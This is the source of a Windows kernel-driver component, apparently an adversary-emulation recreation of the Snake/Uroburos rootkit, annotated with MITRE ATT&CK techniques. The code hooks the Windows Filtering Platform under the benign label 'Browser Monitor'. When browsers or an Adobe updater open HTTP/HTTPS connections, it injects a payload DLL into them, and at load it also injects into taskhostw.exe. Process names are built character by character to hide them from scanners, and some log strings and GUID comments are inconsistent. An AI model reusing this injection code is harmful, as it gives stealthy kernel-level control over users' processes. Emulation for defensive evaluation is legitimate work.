#include <ntifs.h>
#include "driver.h"
#include "wfp.hpp"
#include "inject.hpp"
#include "common.hpp"
#include "payload.hpp"
#include "pidlookup.h"

namespace wfp {

PDEVICE_OBJECT wfp_device{};
HANDLE engine{};

//36cc7d66 - b3d4 - 4e26 - ab10bc837a179062
DEFINE_GUID(callout_guid, 0x36cc7d56, 0xb3d4, 0x4e56, 0xab, 0x10, 0xb5, 0x83, 0x7a, 0x57, 0x95, 0x65);
//294d7f9c - 9cee - 4e8c - 8311062fb55e8724
DEFINE_GUID(sublayer_guid, 0x294d759c, 0x9c5e, 0x4e8c, 0x53, 0x11, 0x06, 0x2f, 0x55, 0x5e, 0x87, 0x54);

/*
 * injection_routine:
 *      About:
 *          Injects the usermodule DLL into the target process
 *      Result:
 *          Returns STATUS_SUCCESS on success, otherwise some error status.
 *      MITRE ATT&CK Techniques:
 *          T1140: Deobfuscate/Decode Files or Information
 *          T1027: Obfuscated Files or Information
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 *          https://public.gdatasoftware.com/Web/Content/INT/Blog/2014/02_2014/documents/GData_Uroburos_RedPaper_EN_v1.pdf
 */
_Use_decl_annotations_
void injection_routine(void*, void* context, PIO_WORKITEM work) {
    auto injection_lock{ static_cast<InjectionLock*>(context) };

    InjectDllArgs args{ injection_lock->pid };
    memcpy(args.dll_path, &PAYLOAD_PATH.Buffer[4], 256);

    kprintf("Injecting %S into PID %u\n", args.pid, args.dll_path);

    NTSTATUS status = inject_dll(args);
    if (NT_ERROR(status)) {
        kprintf("Could not inject DLL: 0x%lx.\n", status);
    }

    ::IoFreeWorkItem(work);
}

_Use_decl_annotations_
void monitor_routine(void*, void* context, PIO_WORKITEM work) {
    auto injection_lock{ static_cast<InjectionLock*>(context) };
    PEPROCESS proc{};

    NTSTATUS status = ::PsLookupProcessByProcessId(
        reinterpret_cast<HANDLE>(injection_lock->pid),
        &proc
    );

    if (NT_ERROR(status)) {
        // krprintf("Previously injected process is dead... unlocking\n", injection_lock->pid);
        injection_lock->pid = 0;
    }
    else {
        LARGE_INTEGER immediate{ 0 };

        // Check for lingering process which has been signaled to exit
        if (STATUS_WAIT_0 == ::KeWaitForSingleObject(
            proc,
            Executive,
            KernelMode,
            false,
            &immediate
        )) {
            injection_lock->pid = 0;
        }

        ::ObDereferenceObject(proc);
    }

    ::IoFreeWorkItem(work);
}

void classify(
    _In_ const FWPS_INCOMING_VALUES*,
    _In_ const FWPS_INCOMING_METADATA_VALUES* meta,
    _Inout_opt_ void*,
    _In_opt_ const void*,
    _In_ const FWPS_FILTER*,
    _In_ UINT64,
    _Inout_ FWPS_CLASSIFY_OUT*
) {
    // krprintf("%u %S\n", meta->processId, meta->processPath->data);

    static InjectionLock injection_lock{};
    common::Locker locker{ injection_lock };
    auto work = ::IoAllocateWorkItem(wfp_device);

    if (0 == injection_lock.pid) {
        injection_lock.pid = meta->processId;
        ::IoQueueWorkItemEx(
            work,
            injection_routine,
            DelayedWorkQueue,
            &injection_lock
        );
    }
    else {
        ::IoQueueWorkItemEx(
            work,
            monitor_routine,
            DelayedWorkQueue,
            &injection_lock
        );
    }
}

NTSTATUS notify(
    _In_ FWPS_CALLOUT_NOTIFY_TYPE,
    _In_ const GUID*,
    _Inout_ FWPS_FILTER3*
) {
    return STATUS_SUCCESS;
}

void flow_delete(
    _In_ UINT16,
    _In_ UINT32,
    _In_ UINT64
) {}

NTSTATUS init(PDEVICE_OBJECT device) {
    wfp_device = device;

    FWPM_SESSION session{};
    session.flags = FWPM_SESSION_FLAG_DYNAMIC;

    NTSTATUS status = ::FwpmEngineOpen(
        nullptr,
        RPC_C_AUTHN_WINNT,
        nullptr,
        &session,
        &engine
    );
    if (NT_ERROR(status)) {
        kprintf("Could not open WFP engine: %x\n", status);
        return status;
    }

    UINT64 pid{};
    char taskhostw[14];
    taskhostw[0] = 't';
    taskhostw[1] = 'a';
    taskhostw[2] = 's';
    taskhostw[3] = 'k';
    taskhostw[4] = 'h';
    taskhostw[5] = 'o';
    taskhostw[6] = 's';
    taskhostw[7] = 't';
    taskhostw[8] = 'w';
    taskhostw[9] = '.';
    taskhostw[10] = 'e';
    taskhostw[11] = 'x';
    taskhostw[12] = 'e';
    taskhostw[13] = '\0';

    auto result = findPidByName(taskhostw, &pid);
    if (!result) {
        kprintf("Could not find services.exe\n", status);
        return STATUS_NOT_FOUND;
    }

    InjectDllArgs args{ pid };
    memcpy(args.dll_path, &PAYLOAD_PATH.Buffer[4], 256);

    kprintf("Injecting %S into PID %u\n", args.pid, args.dll_path);

    status = inject_dll(args, true);
    if (NT_ERROR(status)) {
        kprintf("Could not inject DLL: 0x%lx.\n", status);
        return status;
    }

    return STATUS_SUCCESS;
}

NTSTATUS cleanup() {
    NTSTATUS status = ::FwpmEngineClose(engine);
    if (NT_ERROR(status)) {
        kprintf("Could not close WFP engine: %x\n", status);
        return status;
    }

    status = ::FwpsCalloutUnregisterByKey(&callout_guid);
    if (NT_ERROR(status)) {
        kprintf("Could not unregister callout: %x\n", status);
        return status;
    }

    return STATUS_SUCCESS;
}

/*
 * register_filter:
 *      About:
 *          Monitor when processes make an HTTP request to use this as a trigger for DLL injection.
 *      Result:
 *          Returns STATUS_SUCCESS on success, otherwise some error status.
 *      MITRE ATT&CK Techniques:
 *          T1546: Event Triggered Execution
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
NTSTATUS register_callout() {
    if (nullptr == engine) {
        return STATUS_INVALID_HANDLE;
    }

    FWPM_DISPLAY_DATA display_data{};
    display_data.name = const_cast<wchar_t*>(L"Browser Monitor");
    display_data.description = const_cast<wchar_t*>(L"Monitor browsers for HTTP traffic");

    FWPS_CALLOUT s_callout{};
    s_callout.calloutKey = callout_guid;
    s_callout.classifyFn = classify;
    s_callout.notifyFn = notify;
    s_callout.flowDeleteFn = flow_delete;

    NTSTATUS status = ::FwpsCalloutRegister(
        wfp_device,
        &s_callout,
        nullptr
    );
    if (NT_ERROR(status)) {
        kprintf("Could not register callout: %x\n", status);
        return status;
    }

    FWPM_CALLOUT m_callout{};
    m_callout.calloutKey = callout_guid;
    m_callout.displayData = display_data;
    m_callout.applicableLayer = FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4;
    m_callout.flags = 0;

    status = ::FwpmCalloutAdd(engine, &m_callout, nullptr, nullptr);
    if (NT_ERROR(status)) {
        kprintf("Could not add callout: %x\n", status);
        return status;
    }

    FWPM_SUBLAYER sublayer{};
    sublayer.displayData.name = const_cast<wchar_t*>(L"Browser Monitor Sublayer");
    sublayer.displayData.description = const_cast<wchar_t*>(L"Sublayer for browser monitor callout");
    sublayer.subLayerKey = sublayer_guid;
    sublayer.weight = 65500;

    status = ::FwpmSubLayerAdd(engine, &sublayer, nullptr);
    if (NT_ERROR(status)) {
        kprintf("Could not add sublayer: %x\n", status);
        return status;
    }

    return STATUS_SUCCESS;
}

/*
 * register_filter:
 *      About:
 *          Register an event filter to only trigger when a process makes an HTTP request.
 *      Result:
 *          Returns STATUS_SUCCESS on success, otherwise some error status.
 *      MITRE ATT&CK Techniques:
 *          T1546: Event Triggered Execution
 *      CTI:
 *          https://artemonsecurity.com/snake_whitepaper.pdf
 */
NTSTATUS register_filter() {
    FWPM_FILTER filter{};
    FWPM_FILTER_CONDITION condition[9]{};

    filter.displayData.name = const_cast<wchar_t*>(L"Browser HTTP Filter");
    filter.displayData.description = const_cast<wchar_t*>(L"Capture HTTP/S flows from whitelisted browsers");
    filter.layerKey = FWPM_LAYER_ALE_FLOW_ESTABLISHED_V4;
    filter.subLayerKey = sublayer_guid;
    filter.weight.type = FWP_EMPTY;
    filter.numFilterConditions = 9;
    filter.filterCondition = condition;
    filter.action.type = FWP_ACTION_CALLOUT_INSPECTION;
    filter.action.calloutKey = callout_guid;

    // HTTP
    condition[0].fieldKey = FWPM_CONDITION_IP_REMOTE_PORT;
    condition[0].matchType = FWP_MATCH_EQUAL;
    condition[0].conditionValue.type = FWP_UINT16;
    condition[0].conditionValue.uint16 = 80;

    // HTTPS
    condition[1].fieldKey = FWPM_CONDITION_IP_REMOTE_PORT;
    condition[1].matchType = FWP_MATCH_EQUAL;
    condition[1].conditionValue.type = FWP_UINT16;
    condition[1].conditionValue.uint16 = 443;

    // Application Whitelist
    FWP_BYTE_BLOB blobs[7]{};
    wchar_t applications[7][25];

    applications[0][0] = L'f';
    applications[0][1] = L'i';
    applications[0][2] = L'r';
    applications[0][3] = L'e';
    applications[0][4] = L'f';
    applications[0][5] = L'o';
    applications[0][6] = L'x';
    applications[0][7] = L'.';
    applications[0][8] = L'e';
    applications[0][9] = L'x';
    applications[0][10] = L'e';
    applications[0][11] = L'\0';

    applications[1][0] = L'o';
    applications[1][1] = L'p';
    applications[1][2] = L'e';
    applications[1][3] = L'r';
    applications[1][4] = L'a';
    applications[1][5] = L'.';
    applications[1][6] = L'e';
    applications[1][7] = L'x';
    applications[1][8] = L'e';
    applications[1][9] = L'\0';

    applications[2][0] = L'c';
    applications[2][1] = L'h';
    applications[2][2] = L'r';
    applications[2][3] = L'o';
    applications[2][4] = L'm';
    applications[2][5] = L'e';
    applications[2][6] = L'.';
    applications[2][7] = L'e';
    applications[2][8] = L'x';
    applications[2][9] = L'e';
    applications[2][10] = L'\0';

    applications[3][0] = L'm';
    applications[3][1] = L'o';
    applications[3][2] = L'z';
    applications[3][3] = L'i';
    applications[3][4] = L'l';
    applications[3][5] = L'l';
    applications[3][6] = L'a';
    applications[3][7] = L'.';
    applications[3][8] = L'e';
    applications[3][9] = L'x';
    applications[3][10] = L'e';
    applications[3][11] = L'\0';

    applications[4][0] = L'M';
    applications[4][1] = L'i';
    applications[4][2] = L'c';
    applications[4][3] = L'r';
    applications[4][4] = L'o';
    applications[4][5] = L's';
    applications[4][6] = L'o';
    applications[4][7] = L'f';
    applications[4][8] = L't';
    applications[4][9] = L'E';
    applications[4][10] = L'd';
    applications[4][11] = L'g';
    applications[4][12] = L'e';
    applications[4][13] = L'.';
    applications[4][14] = L'e';
    applications[4][15] = L'x';
    applications[4][16] = L'e';
    applications[4][17] = L'\0';

    applications[5][0] = L'm';
    applications[5][1] = L's';
    applications[5][2] = L'e';
    applications[5][3] = L'd';
    applications[5][4] = L'g';
    applications[5][5] = L'e';
    applications[5][6] = L'.';
    applications[5][7] = L'e';
    applications[5][8] = L'x';
    applications[5][9] = L'e';
    applications[5][10] = L'\0';

    applications[6][0] = L'a';
    applications[6][1] = L'd';
    applications[6][2] = L'o';
    applications[6][3] = L'b';
    applications[6][4] = L'e';
    applications[6][5] = L'u';
    applications[6][6] = L'p';
    applications[6][7] = L'd';
    applications[6][8] = L'a';
    applications[6][9] = L't';
    applications[6][10] = L'e';
    applications[6][11] = L'r';
    applications[6][12] = L'.';
    applications[6][13] = L'e';
    applications[6][14] = L'x';
    applications[6][15] = L'e';
    applications[6][16] = L'\0';

    for (auto i = 2; auto app : applications) {
        condition[i].fieldKey = FWPM_CONDITION_ALE_APP_ID;
        condition[i].matchType = FWP_MATCH_PREFIX;
        condition[i].conditionValue.type = FWP_BYTE_BLOB_TYPE;
        condition[i].conditionValue.byteBlob = &blobs[i - 2];
        condition[i].conditionValue.byteBlob->data = reinterpret_cast<UINT8*>(app);
        condition[i].conditionValue.byteBlob->size = static_cast<UINT32>((wcslen(app) + 1) * sizeof(wchar_t));
        i++;
    }

    NTSTATUS status = ::FwpmFilterAdd(engine, &filter, nullptr, nullptr);
    if (NT_ERROR(status)) {
        kprintf("Could not add filter: %x\n", status);
        return status;
    }

    return STATUS_SUCCESS;
}

} // namespace wfp
